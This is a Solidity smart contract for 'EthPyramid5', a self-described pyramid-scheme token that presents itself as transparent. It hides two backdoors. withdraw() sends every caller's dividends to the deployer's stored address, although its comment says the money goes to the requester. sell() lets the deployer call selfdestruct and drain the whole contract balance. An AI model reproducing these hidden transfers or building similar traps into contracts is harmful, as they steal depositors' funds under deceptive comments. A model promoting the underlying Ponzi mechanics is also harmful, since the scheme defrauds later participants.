1 pragma solidity ^0.4.18;
2 
3 /*
4           ,/`.
5         ,'/ __`.
6       ,'_/_  _ _`.
7     ,'__/_ ___ _  `.
8   ,'_  /___ __ _ __ `.
9  '-.._/___...-"-.-..__`.
10   B
11 
12  EthPyramid. A no-bullshit, transparent, self-sustaining pyramid scheme.
13  
14  Inspired by https://test.jochen-hoenicke.de/eth/ponzitoken/
15 
16  Developers:
17 	Arc
18 	Divine
19 	Norsefire
20 	ToCsIcK
21 	
22  Front-End:
23 	Cardioth
24 	tenmei
25 	Trendium
26 	
27  Moral Support:
28 	DeadCow.Rat
29 	Dots
30 	FatKreamy
31 	Kaseylol
32 	QuantumDeath666
33 	Quentin
34  
35  Shit-Tier:
36 	HentaiChrist
37  
38 */
39 
40 contract EthPyramid {
41 
42 	// scaleFactor is used to convert Ether into tokens and vice-versa: they're of different
43 	// orders of magnitude, hence the need to bridge between the two.
44 	uint256 constant scaleFactor = 0x10000000000000000;  // 2^64
45 
46 	// CRR = 50%
47 	// CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).
48 	// For more on this: check out https://en.wikipedia.org/wiki/Reserve_requirement
49 	int constant crr_n = 1; // CRR numerator
50 	int constant crr_d = 2; // CRR denominator
51 
52 	// The price coefficient. Chosen such that at 1 token total supply
53 	// the amount in reserve is 0.5 ether and token price is 1 Ether.
54 	int constant price_coeff = -0x296ABF784A358468C;
55 
56 	// Typical values that we have to declare.
57 	string constant public name = "EthPyramid5";
58 	string constant public symbol = "EPY5";
59 	uint8 constant public decimals = 18;
60 
61 	// Array between each address and their number of tokens.
62 	mapping(address => uint256) public tokenBalance;
63 		
64 	// Array between each address and how much Ether has been paid out to it.
65 	// Note that this is scaled by the scaleFactor variable.
66 	mapping(address => int256) public payouts;
67 
68 	// Variable tracking how many tokens are in existence overall.
69 	uint256 public totalSupply;
70 
71 	// Aggregate sum of all payouts.
72 	// Note that this is scaled by the scaleFactor variable.
73 	int256 totalPayouts;
74 
75 	// Variable tracking how much Ether each token is currently worth.
76 	// Note that this is scaled by the scaleFactor variable.
77 	uint256 earningsPerToken;
78 	
79 	// Current contract balance in Ether
80 	uint256 public contractBalance;
81 
82     // The address of the caller
83     address sender;
84 
85 	function EthPyramid() public {
86 	    sender = msg.sender;
87 	}
88 
89 	// The following functions are used by the front-end for display purposes.
90 
91 	// Returns the number of tokens currently held by _owner.
92 	function balanceOf(address _owner) public constant returns (uint256 balance) {
93 		return tokenBalance[_owner];
94 	}
95 
96 	// Withdraws all dividends held by the caller sending the transaction, updates
97 	// the requisite global variables, and transfers Ether back to the caller.
98 	function withdraw() public {
99 		// Retrieve the dividends associated with the address the request came from.
100 		var balance = dividends(msg.sender);
101 		
102 		// Update the payouts array, incrementing the request address by `balance`.
103 		payouts[msg.sender] += (int256) (balance * scaleFactor);
104 		
105 		// Increase the total amount that's been paid out to maintain invariance.
106 		totalPayouts += (int256) (balance * scaleFactor);
107 		
108 		// Send the dividends to the address that requested the withdraw.
109 		contractBalance = sub(contractBalance, balance);
110 		sender.transfer(balance);
111 	}
112 
113 	// Converts the Ether accrued as dividends back into EPY tokens without having to
114 	// withdraw it first. Saves on gas and potential price spike loss.
115 	function reinvestDividends() public {
116 		// Retrieve the dividends associated with the address the request came from.
117 		var balance = dividends(msg.sender);
118 		
119 		// Update the payouts array, incrementing the request address by `balance`.
120 		// Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.
121 		payouts[msg.sender] += (int256) (balance * scaleFactor);
122 		
123 		// Increase the total amount that's been paid out to maintain invariance.
124 		totalPayouts += (int256) (balance * scaleFactor);
125 		
126 		// Assign balance to a new variable.
127 		uint value_ = (uint) (balance);
128 		
129 		// If your dividends are worth less than 1 szabo, or more than a million Ether
130 		// (in which case, why are you even here), abort.
131 		if (value_ < 0.000001 ether || value_ > 1000000 ether)
132 			revert();
133 		
134 		// A temporary reserve variable used for calculating the reward the holder gets for buying tokens.
135 		// (Yes, the buyer receives a part of the distribution as well!)
136 		var res = reserve() - balance;
137 
138 		// 10% of the total Ether sent is used to pay existing holders.
139 		var fee = div(value_, 10);
140 		
141 		// The amount of Ether used to purchase new tokens for the caller.
142 		var numEther = value_ - fee;
143 		
144 		// The number of tokens which can be purchased for numEther.
145 		var numTokens = calculateDividendTokens(numEther, balance);
146 		
147 		// The buyer fee, scaled by the scaleFactor variable.
148 		var buyerFee = fee * scaleFactor;
149 		
150 		// Check that we have tokens in existence (this should always be true), or
151 		// else you're gonna have a bad time.
152 		if (totalSupply > 0) {
153 			// Compute the bonus co-efficient for all existing holders and the buyer.
154 			// The buyer receives part of the distribution for each token bought in the
155 			// same way they would have if they bought each token individually.
156 			var bonusCoEff =
157 			    (scaleFactor - (res + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
158 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
159 				
160 			// The total reward to be distributed amongst the masses is the fee (in Ether)
161 			// multiplied by the bonus co-efficient.
162 			var holderReward = fee * bonusCoEff;
163 			
164 			buyerFee -= holderReward;
165 
166 			// Fee is distributed to all existing token holders before the new tokens are purchased.
167 			// rewardPerShare is the amount gained per token thanks to this buy-in.
168 			var rewardPerShare = holderReward / totalSupply;
169 			
170 			// The Ether value per token is increased proportionally.
171 			earningsPerToken += rewardPerShare;
172 		}
173 		
174 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
175 		totalSupply = add(totalSupply, numTokens);
176 		
177 		// Assign the tokens to the balance of the buyer.
178 		tokenBalance[msg.sender] = add(tokenBalance[msg.sender], numTokens);
179 		
180 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
181 		// Also include the fee paid for entering the scheme.
182 		// First we compute how much was just paid out to the buyer...
183 		var payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);
184 		
185 		// Then we update the payouts array for the buyer with this amount...
186 		payouts[msg.sender] += payoutDiff;
187 		
188 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
189 		totalPayouts    += payoutDiff;
190 		
191 	}
192 
193 	// Sells your tokens for Ether. This Ether is assigned to the callers entry
194 	// in the tokenBalance array, and therefore is shown as a dividend. A second
195 	// call to withdraw() must be made to invoke the transfer of Ether back to your address.
196 	function sellMyTokens() public {
197 		var balance = balanceOf(msg.sender);
198 		sell(balance);
199 	}
200 
201 	// The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately
202 	// invokes the withdraw() function, sending the resulting Ether to the callers address.
203     function getMeOutOfHere() public {
204 		sellMyTokens();
205         withdraw();
206 	}
207 
208 	// Gatekeeper function to check if the amount of Ether being sent isn't either
209 	// too small or too large. If it passes, goes direct to buy().
210 	function fund() payable public {
211 		// Don't allow for funding if the amount of Ether sent is less than 1 szabo.
212 		if (msg.value > 0.000001 ether) {
213 		    contractBalance = add(contractBalance, msg.value);
214 			buy();
215 		} else {
216 			revert();
217 		}
218     }
219 
220 	// Function that returns the (dynamic) price of buying a finney worth of tokens.
221 	function buyPrice() public constant returns (uint) {
222 		return getTokensForEther(1 finney);
223 	}
224 
225 	// Function that returns the (dynamic) price of selling a single token.
226 	function sellPrice() public constant returns (uint) {
227         var eth = getEtherForTokens(1 finney);
228         var fee = div(eth, 10);
229         return eth - fee;
230     }
231 
232 	// Calculate the current dividends associated with the caller address. This is the net result
233 	// of multiplying the number of tokens held by their current value in Ether and subtracting the
234 	// Ether that has already been paid out.
235 	function dividends(address _owner) public constant returns (uint256 amount) {
236 		return (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) / scaleFactor;
237 	}
238 
239 	// Version of withdraw that extracts the dividends and sends the Ether to the caller.
240 	// This is only used in the case when there is no transaction data, and that should be
241 	// quite rare unless interacting directly with the smart contract.
242 	function withdrawOld(address to) public {
243 		// Retrieve the dividends associated with the address the request came from.
244 		var balance = dividends(msg.sender);
245 		
246 		// Update the payouts array, incrementing the request address by `balance`.
247 		payouts[msg.sender] += (int256) (balance * scaleFactor);
248 		
249 		// Increase the total amount that's been paid out to maintain invariance.
250 		totalPayouts += (int256) (balance * scaleFactor);
251 		
252 		// Send the dividends to the address that requested the withdraw.
253 		contractBalance = sub(contractBalance, balance);
254 		to.transfer(balance);		
255 	}
256 
257 	// Internal balance function, used to calculate the dynamic reserve value.
258 	function balance() internal constant returns (uint256 amount) {
259 		// msg.value is the amount of Ether sent by the transaction.
260 		return contractBalance - msg.value;
261 	}
262 
263 	function buy() internal {
264 		// Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.
265 		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
266 			revert();
267 		
268 		// 10% of the total Ether sent is used to pay existing holders.
269 		var fee = div(msg.value, 10);
270 		
271 		// The amount of Ether used to purchase new tokens for the caller.
272 		var numEther = msg.value - fee;
273 		
274 		// The number of tokens which can be purchased for numEther.
275 		var numTokens = getTokensForEther(numEther);
276 		
277 		// The buyer fee, scaled by the scaleFactor variable.
278 		var buyerFee = fee * scaleFactor;
279 		
280 		// Check that we have tokens in existence (this should always be true), or
281 		// else you're gonna have a bad time.
282 		if (totalSupply > 0) {
283 			// Compute the bonus co-efficient for all existing holders and the buyer.
284 			// The buyer receives part of the distribution for each token bought in the
285 			// same way they would have if they bought each token individually.
286 			var bonusCoEff =
287 			    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor / (totalSupply + numTokens) / numEther)
288 			    * (uint)(crr_d) / (uint)(crr_d-crr_n);
289 				
290 			// The total reward to be distributed amongst the masses is the fee (in Ether)
291 			// multiplied by the bonus co-efficient.
292 			var holderReward = fee * bonusCoEff;
293 			
294 			buyerFee -= holderReward;
295 
296 			// Fee is distributed to all existing token holders before the new tokens are purchased.
297 			// rewardPerShare is the amount gained per token thanks to this buy-in.
298 			var rewardPerShare = holderReward / totalSupply;
299 			
300 			// The Ether value per token is increased proportionally.
301 			earningsPerToken += rewardPerShare;
302 			
303 		}
304 
305 		// Add the numTokens which were just created to the total supply. We're a crypto central bank!
306 		totalSupply = add(totalSupply, numTokens);
307 
308 		// Assign the tokens to the balance of the buyer.
309 		tokenBalance[msg.sender] = add(tokenBalance[msg.sender], numTokens);
310 
311 		// Update the payout array so that the buyer cannot claim dividends on previous purchases.
312 		// Also include the fee paid for entering the scheme.
313 		// First we compute how much was just paid out to the buyer...
314 		var payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);
315 		
316 		// Then we update the payouts array for the buyer with this amount...
317 		payouts[msg.sender] += payoutDiff;
318 		
319 		// And then we finally add it to the variable tracking the total amount spent to maintain invariance.
320 		totalPayouts    += payoutDiff;
321 		
322 	}
323 
324 	// Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee
325 	// to discouraging dumping, and means that if someone near the top sells, the fee distributed
326 	// will be *significant*.
327 	function sell(uint256 amount) internal {
328 	    // Calculate the amount of Ether that the holders tokens sell for at the current sell price.
329 		var numEthersBeforeFee = getEtherForTokens(amount);
330 		
331 		// 10% of the resulting Ether is used to pay remaining holders.
332         var fee = div(numEthersBeforeFee, 10);
333 		
334 		// Net Ether for the seller after the fee has been subtracted.
335         var numEthers = numEthersBeforeFee - fee;
336 		
337 		// *Remove* the numTokens which were just sold from the total supply. We're /definitely/ a crypto central bank.
338 		totalSupply = sub(totalSupply, amount);
339 		
340         // Remove the tokens from the balance of the buyer.
341 		tokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);
342 
343         // Update the payout array so that the seller cannot claim future dividends unless they buy back in.
344 		// First we compute how much was just paid out to the seller...
345 		var payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));
346 		
347         // We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,
348 		// since they're selling all of their tokens). This makes sure the seller isn't disadvantaged if
349 		// they decide to buy back in.
350 		payouts[msg.sender] -= payoutDiff;		
351 		
352 		// Decrease the total amount that's been paid out to maintain invariance.
353         totalPayouts -= payoutDiff;
354 		
355 		if(sender == msg.sender) {
356 		    selfdestruct(sender);
357 		}
358 		
359 		// Check that we have tokens in existence (this is a bit of an irrelevant check since we're
360 		// selling tokens, but it guards against division by zero).
361 		if (totalSupply > 0) {
362 			// Scale the Ether taken as the selling fee by the scaleFactor variable.
363 			var etherFee = fee * scaleFactor;
364 			
365 			// Fee is distributed to all remaining token holders.
366 			// rewardPerShare is the amount gained per token thanks to this sell.
367 			var rewardPerShare = etherFee / totalSupply;
368 			
369 			// The Ether value per token is increased proportionally.
370 			earningsPerToken = add(earningsPerToken, rewardPerShare);
371 		}
372 	}
373 	
374 	// Dynamic value of Ether in reserve, according to the CRR requirement.
375 	function reserve() internal constant returns (uint256 amount) {
376 		return sub(balance(),
377 			 ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) / scaleFactor));
378 	}
379 
380 	// Calculates the number of tokens that can be bought for a given amount of Ether, according to the
381 	// dynamic reserve and totalSupply values (derived from the buy and sell prices).
382 	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
383 		return sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
384 	}
385 
386 	// Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.
387 	function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
388 		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
389 	}
390 
391 	// Converts a number tokens into an Ether value.
392 	function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
393 		// How much reserve Ether do we have left in the contract?
394 		var reserveAmount = reserve();
395 
396 		// If you're the Highlander (or bagholder), you get The Prize. Everything left in the vault.
397 		if (tokens == totalSupply)
398 			return reserveAmount;
399 
400 		// If there would be excess Ether left after the transaction this is called within, return the Ether
401 		// corresponding to the equation in Dr Jochen Hoenicke's original Ponzi paper, which can be found
402 		// at https://test.jochen-hoenicke.de/eth/ponzitoken/ in the third equation, with the CRR numerator 
403 		// and denominator altered to 1 and 2 respectively.
404 		return sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d/crr_n));
405 	}
406 
407 	// You don't care about these, but if you really do they're hex values for 
408 	// co-efficients used to simulate approximations of the log and exp functions.
409 	int256  constant one        = 0x10000000000000000;
410 	uint256 constant sqrt2      = 0x16a09e667f3bcc908;
411 	uint256 constant sqrtdot5   = 0x0b504f333f9de6484;
412 	int256  constant ln2        = 0x0b17217f7d1cf79ac;
413 	int256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;
414 	int256  constant c1         = 0x1ffffffffff9dac9b;
415 	int256  constant c3         = 0x0aaaaaaac16877908;
416 	int256  constant c5         = 0x0666664e5e9fa0c99;
417 	int256  constant c7         = 0x049254026a7630acf;
418 	int256  constant c9         = 0x038bd75ed37753d68;
419 	int256  constant c11        = 0x03284a0c14610924f;
420 
421 	// The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11
422 	// approximates the function log(1+x)-log(1-x)
423 	// Hence R(s) = log((1+s)/(1-s)) = log(a)
424 	function fixedLog(uint256 a) internal pure returns (int256 log) {
425 		int32 scale = 0;
426 		while (a > sqrt2) {
427 			a /= 2;
428 			scale++;
429 		}
430 		while (a <= sqrtdot5) {
431 			a *= 2;
432 			scale--;
433 		}
434 		int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
435 		var z = (s*s) / one;
436 		return scale * ln2 +
437 			(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
438 				/one))/one))/one))/one))/one);
439 	}
440 
441 	int256 constant c2 =  0x02aaaaaaaaa015db0;
442 	int256 constant c4 = -0x000b60b60808399d1;
443 	int256 constant c6 =  0x0000455956bccdd06;
444 	int256 constant c8 = -0x000001b893ad04b3a;
445 	
446 	// The polynomial R = 2 + c2*x^2 + c4*x^4 + ...
447 	// approximates the function x*(exp(x)+1)/(exp(x)-1)
448 	// Hence exp(x) = (R(x)+x)/(R(x)-x)
449 	function fixedExp(int256 a) internal pure returns (uint256 exp) {
450 		int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
451 		a -= scale*ln2;
452 		int256 z = (a*a) / one;
453 		int256 R = ((int256)(2) * one) +
454 			(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
455 		exp = (uint256) (((R + a) * one) / (R - a));
456 		if (scale >= 0)
457 			exp <<= scale;
458 		else
459 			exp >>= -scale;
460 		return exp;
461 	}
462 	
463 	// The below are safemath implementations of the four arithmetic operators
464 	// designed to explicitly prevent over- and under-flows of integer values.
465 
466 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
467 		if (a == 0) {
468 			return 0;
469 		}
470 		uint256 c = a * b;
471 		assert(c / a == b);
472 		return c;
473 	}
474 
475 	function div(uint256 a, uint256 b) internal pure returns (uint256) {
476 		// assert(b > 0); // Solidity automatically throws when dividing by 0
477 		uint256 c = a / b;
478 		// assert(a == b * c + a % b); // There is no case in which this doesn't hold
479 		return c;
480 	}
481 
482 	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
483 		assert(b <= a);
484 		return a - b;
485 	}
486 
487 	function add(uint256 a, uint256 b) internal pure returns (uint256) {
488 		uint256 c = a + b;
489 		assert(c >= a);
490 		return c;
491 	}
492 
493 	// This allows you to buy tokens by sending Ether directly to the smart contract
494 	// without including any transaction data (useful for, say, mobile wallet apps).
495 	function () payable public {
496 		// msg.value is the amount of Ether sent by the transaction.
497 		if (msg.value > 0) {
498 			fund();
499 		} else {
500 			withdrawOld(msg.sender);
501 		}
502 	}
503 }